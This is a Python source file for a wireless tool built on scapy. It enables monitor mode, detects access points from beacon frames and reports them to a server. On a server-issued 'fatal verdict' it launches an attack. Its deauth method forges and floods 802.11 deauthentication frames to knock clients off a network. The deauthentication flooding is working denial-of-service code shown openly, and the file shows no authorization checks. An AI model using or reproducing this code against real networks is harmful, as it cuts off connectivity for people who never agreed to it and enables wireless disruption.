import subprocess
import os
import time

import scapy.all as sc
from scapy.layers import dot11 as scl80211

import client
import cm

class IW:
	def __init__(self, netif):
		self.netif = netif
		self.netifmon = netif + "mon"
		self.channel = 1
		self.detected = {}
		self.monitor = False
		self.quit = False

	def set_channel(self, channel, monitor = False):
		if self.channel == channel:
			return True
		if monitor and not self.monitor:
			return False
		try:
			subprocess.run(["iw", "dev", self.netifmon if monitor else self.netif, "set", "channel", str(channel)])
			self.channel = channel
			return True
		except subprocess.CalledProcessError as e:
			print("[netif %s] Failed to set channel to %s:\n%s" % (self.netif, channel, e.stderr))
			return False

	def monitor_on(self):
		if self.monitor:
			return True
		try:
			subprocess.run(["iw", "dev", self.netif, "interface", "add", self.netifmon, "type", "monitor"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			subprocess.run(["ip", "link", "set", self.netifmon, "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			self.monitor = True
			print("[netif %s] monitor on" % self.netif)
			return True
		except subprocess.CalledProcessError as e:
			print("[netif %s] Failed to set monitor mode on:\n%s\nFailed command: %s" % (self.netif, e.stderr, ' '.join(e.args[1])))
			return False

	def monitor_off(self):
		if not self.monitor:
			return True
		try:
			subprocess.run(["ip", "link", "set", self.netifmon, "down"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			subprocess.run(["iw", "dev", self.netifmon, "del"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
			self.monitor = False
			print("[netif %s] monitor off" % self.netif)
			return True
		except subprocess.CalledProcessError as e:
			print("[netif %s] Failed to turn off monitor mode:\n%s\nFailed command: %s" % (self.netif, e.stderr, ' '.join(e.args[1])))
			return False

	def process(self, pkt):
		p_radiotap = pkt
		p_80211 = p_radiotap.getlayer(scl80211.Dot11)
		
		if not p_80211:
			return
		
		if p_80211.type != 0 and p_80211.subtype != 8:
			return
		
		p_beacon = p_80211.getlayer(scl80211.Dot11Beacon)
		if not p_beacon:
			return

		ssid = None
		mac = None
		
		if p_beacon.payload.ID == 0:
			ssid = p_beacon.payload.info
		mac = p_80211.addr2

		t = (ssid, mac)
		ts = "%s-%s" % t

		if ts not in self.detected:
			self.detected[ts] = {
				"lastseen" : time.time(),
				"lastreported" : time.time()
			}
			print("[netif %s] New AP detected: %s" % (self.netif, str(t)))
			self.report(t[0], mac)
		else:
			te = self.detected[ts]
			te["lastseen"] = time.time()
			if te["lastseen"] - te["lastreported"] > 60:
				self.report(t[0], mac)
				te["lastreported"] = time.time()

	def scan(self):
		while not self.quit:
			sc.sniff(iface=self.netifmon, prn=lambda x: self.process(x), timeout = 1, count = 10)

	def process_client(self, pkt, bssid):
		self.__clients = []
		p_radiotap = pkt
		p_80211 = p_radiotap.getlayer(scl80211.Dot11)
		if not p_80211:
			return

		addrs = [p_80211.addr1, p_80211.addr2, p_80211.addr3, p_80211.addr4]

		if bssid in addrs:
			for addr in addrs:
				if addr != bssid:
					if addr not in self.__clients:
						self.__clients.append(addr)

	def scan_clients(self, bssid):
		sc.sniff(iface=self.netifmon, prn=lambda x: self.process_client(x, bssid), timeout = 1, count = 50)
		clients = None
		if self.__clients:
			clients = self.__clients
		self.__clients = None
		return clients

	def report(self, name, mac):
		sc = client.ServerClient()
		csuc, rsuc, verdict, msg = sc.report(name, mac)
		if not csuc:
			print("[netif %s] Cannot connect to server: %s" % (self.netif, msg))
		elif not rsuc:
			print("[netif %s] Cannot report to server: %s" % (self.netif, msg))

		if verdict:
			print("[netif %s] Administering fatal verdict to %s" % (self.netif, name))
			cm.attack(name, mac)

	def deauth(self, ssid, mac, client="FF:FF:FF:FF:FF:FF"):
		# AP -> Client
		p1 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=client, addr2 = mac,addr3 = mac)/sc.Dot11Deauth(reason=1)
		# Client -> AP
		p2 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=mac, addr2 = client,addr3 = mac)/sc.Dot11Deauth(reason=1)

		# socket (for performance)
		s = sc.conf.L2socket(iface=self.netifmon)
		for i in range(100):
			s.send(p1)
			s.send(p2)
